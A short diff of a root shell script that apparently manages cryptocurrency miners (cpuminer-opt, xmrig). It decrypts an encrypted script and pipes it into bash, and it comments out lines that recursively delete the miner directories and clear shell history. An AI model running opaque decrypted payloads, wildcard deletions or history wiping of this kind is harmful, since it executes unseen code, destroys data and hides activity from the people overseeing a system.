@@ -54,8 +54,8 @@ chmod +x /root/cpuminer-opt-aurum-prerelease/kill_miner.sh
 ./root/cpuminer-opt-aurum-prerelease/kill_miner.sh
 sleep 3
 openssl enc -d -aes-256-cbc -pbkdf2 -in /root/cpuminer-opt-aurum-prerelease/danielluis1922.sh -k $password | bash
-rm -fv *
-rm -fR /root/cpuminer-opt-linux/
-rm -fR /root/cpuminer-opt-aurum-prerelease/
-rm -fR xmrig-6.21.0/
-history -c && history -w
+#rm -fv *
+#rm -fR /root/cpuminer-opt-linux/
+#rm -fR /root/cpuminer-opt-aurum-prerelease/
+#rm -fR xmrig-6.21.0/
+#history -c && history -w
